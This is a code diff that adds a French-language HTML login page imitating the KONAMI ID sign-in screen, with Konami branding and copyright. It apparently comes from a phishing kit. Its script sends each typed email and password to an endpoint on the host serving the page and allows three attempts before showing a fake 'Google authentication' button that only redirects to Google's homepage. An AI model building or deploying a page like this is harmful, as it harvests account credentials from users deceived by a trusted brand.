@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KONAMI ID - Connexion</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background-color: #f2f2f2;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        header {
+            background: #fff;
+            padding: 15px 20px;
+            border-bottom: none;
+            display: flex;
+            align-items: center;
+        }
+
+        .logo-text {
+            color: #c00010;
+            font-weight: bold;
+            font-size: 24px;
+            letter-spacing: 2px;
+            font-family: sans-serif;
+        }
+
+        .main-container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-box {
+            background: #fff;
+            width: 100%;
+            max-width: 480px;
+            padding: 40px;
+            border: 1px solid #dcdcdc;
+            border-radius: 4px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        h2 {
+            color: #777;
+            font-weight: 300;
+            font-size: 24px;
+            margin-bottom: 30px;
+            letter-spacing: 1px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 15px;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #c00010;
+        }
+
+        .btn-red {
+            background-color: #c00010;
+            color: white;
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-bottom: 25px;
+        }
+
+        .btn-red:hover {
+            background-color: #a0000d;
+        }
+
+        .separator {
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            color: #999;
+            font-size: 14px;
+        }
+
+        .separator::before, .separator::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #ddd;
+            margin: 0 15px;
+        }
+
+        .btn-google {
+            background: linear-gradient(135deg, #4285F4, #1F2937);
+            color: white;
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .btn-google:hover {
+            opacity: 0.9;
+        }
+
+        .error-message {
+            background: #fff3cd;
+            color: #856404;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            border: 1px solid #ffeaa7;
+            display: none;
+        }
+
+        .attempts-counter {
+            font-size: 12px;
+            color: #999;
+            margin-top: 15px;
+        }
+
+        .register-link {
+            color: #c00010;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .register-link:hover {
+            text-decoration: underline;
+        }
+
+        footer {
+            padding: 20px;
+            background: transparent;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="logo-text">KONAMI</div>
+</header>
+
+<div class="main-container">
+    <div class="login-box">
+        <h2>KONAMI ID - Connexion</h2>
+
+        <div class="error-message" id="errorMsg"></div>
+
+        <form id="loginForm">
+            <input type="email" id="emailInput" class="input-field" placeholder="KONAMI ID / E-mail address" required>
+            
+            <input type="password" id="passwordInput" class="input-field" placeholder="Mot de passe" required>
+
+            <button type="submit" class="btn-red">Se connecter</button>
+        </form>
+
+        <div id="googleSection" style="display: none;">
+            <button class="btn-google" id="googleBtn">
+                <span style="font-size: 18px;">🔐</span> Authentification Google
+            </button>
+        </div>
+
+        <div class="separator"><span>OU</span></div>
+
+        <p style="color: #666; margin-top: 20px;">
+            Vous n'avez pas de compte ?
+            <a href="page1.html" class="register-link">S'inscrire</a>
+        </p>
+
+        <div class="attempts-counter">
+            <span id="attemptsText">Tentatives disponibles: <strong id="attemptsCount">3</strong>/3</span>
+        </div>
+    </div>
+</div>
+
+<footer>
+    <div class="footer-links">
+        <a href="#">CGU / Confidentialité</a> |
+        <a href="#">SUPPORT</a> |
+        <a href="#">Informations sur l'entreprise</a>
+    </div>
+    <p>©2022 Konami Digital Entertainment</p>
+</footer>
+
+<script>
+    const API_BASE_URL = window.location.origin;
+    let loginAttempts = 0;
+    const MAX_ATTEMPTS = 3;
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById('emailInput').value;
+        const password = document.getElementById('passwordInput').value;
+        const errorDiv = document.getElementById('errorMsg');
+
+        fetch(`${API_BASE_URL}/api/login-verify`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email, password })
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.success) {
+                // Connexion réussie
+                errorDiv.style.display = 'none';
+                alert(`Bienvenue ${email} !`);
+                window.location.href = 'welcome.html';
+            } else {
+                loginAttempts++;
+                const remainingAttempts = MAX_ATTEMPTS - loginAttempts;
+
+                errorDiv.textContent = `❌ Email ou mot de passe incorrect. Tentative ${loginAttempts}/${MAX_ATTEMPTS}`;
+                errorDiv.style.display = 'block';
+
+                document.getElementById('attemptsCount').textContent = remainingAttempts;
+
+                if (loginAttempts >= MAX_ATTEMPTS) {
+                    // Afficher Google auth après 3 tentatives
+                    document.getElementById('googleSection').style.display = 'block';
+                    document.getElementById('loginForm').style.display = 'none';
+                    errorDiv.textContent = '❌ Trop de tentatives échouées. Veuillez utiliser Google pour vous authentifier.';
+                }
+            }
+        })
+        .catch(err => {
+            errorDiv.textContent = '⚠️ Erreur de connexion au serveur.';
+            errorDiv.style.display = 'block';
+            console.error(err);
+        });
+    });
+
+    document.getElementById('googleBtn').addEventListener('click', function() {
+        alert('🔐 Authentification Google - Redirection vers Google...');
+        // Vous pouvez implémenter Google OAuth ici
+        window.location.href = 'https://accounts.google.com';
+    });
+</script>
+
+</body>
+</html>
